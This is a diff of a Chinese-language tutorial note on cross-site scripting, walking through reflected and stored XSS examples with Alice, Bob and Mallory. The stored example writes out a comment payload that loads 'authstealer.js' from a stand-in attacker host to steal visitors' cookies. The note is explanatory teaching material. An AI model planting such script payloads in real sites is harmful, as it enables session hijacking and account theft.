@@ -6,7 +6,7 @@ wiki里讲了两个xss攻击的例子. 非持续性xss(Non-persistent)，也称�
 
 ## Non-persistent
 
-Alice 经常去一个Blob的网站，且Blob的网站允许Alice使用username/password登录和存储一些敏感信息，例如账单信息
+Alice 经常去一个Blob的网站，且Blob的网站允许Alice使用username/password登录和存储一些敏感信息，
 当用户登录的时候Blob会将认证凭据存到Cookie中以供client到server端验证身份。
 
 Mallory发现Bob的网站存在reflected xss 漏洞, 过程如下:
@@ -22,7 +22,7 @@ Mallory发现Bob的网站存在reflected xss 漏洞, 过程如下:
 
 接着Mallory将该地址通过email的形式发送给一些使用blobwebsite的成员，并且还告诉他们一些诱导性信息，例如:  [点击查看可爱的小狗狗](https://www.google.com/search?q=cute+puppy&tbm=isch&tbo=u&source=univ&sa=X&ved=0ahUKEwjB587hru_TAhUV3GMKHXgJAO4QsAQIIg&biw=1263&bih=703)
 
-当该email被喜欢小狗的alice打开的时候，即使Alice比较有心的查看了url之后恐怕也不会过度起疑。但是当Alice随手点开这条链接之后会看到`pupples not found`以及伴随着的Mallory脚本的执行。(此时便触发了xss攻击行为)。 这时候Mallory的脚本几乎可做任何事情, 包括将Alice的登录凭证Cookie发送给Mallory的服务器。 拿到登录凭证之后Mallory便可以伪装成Alice登录到blobwebsite，并且查看其敏感信息。更加过分一些可以更改掉Alice的密码，让Alice无法登陆。
+当该email被喜欢小狗的alice打开的时候，即使Alice比较有心的查看了url之后恐怕也不会过度起疑。但是当Alice随手点开这条链接之后会看到`pupples not found`以及伴随着的Mallory脚本的执行。(此时便触发了xss攻击行为)。 这时候Mallory的脚本几乎可做任何事情, 包括将Alice的登录凭证Cookie发送给Mallory的服务器。 拿到登录凭证之后Mallory便可以伪装成Alice登录到blobwebsite，并且查看其敏感信息。更加过分一些还可以更改掉Alice的密码，让Alice无法登陆。
 
 
 xss攻击的预防可以用下面几种方法
@@ -48,9 +48,12 @@ Mallory发现Blob的网站存在一个xss漏洞: 如果你在一个帖子下面�
 
 接着Mallory在一个帖子下面发了一条留言`I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">`
 
-让其他人(不只是作者)加载该页面时Mallory的脚本都会被执行，并且偷取他们的Cookie发送到Mallory的服务器。
+当其他人(不只是作者)加载该页面时Mallory的脚本都会被执行，并且偷取他们的Cookie发送到Mallory的服务器。
 
 之后Mallory就可以使用这些登录凭据来做任何事情了。
 
 
-其实xss的种类有很多种，其中原理是将恶意脚本注入页面内，上面的xss防范方法对于很多情况下都适用。
+## 结语
+
+其实xss的种类有很多种，其中原理全部是想尽办法将恶意脚本注入页面内，并且执行攻击者的脚本。
+上面的xss防范方法对于很多情况下都适用。
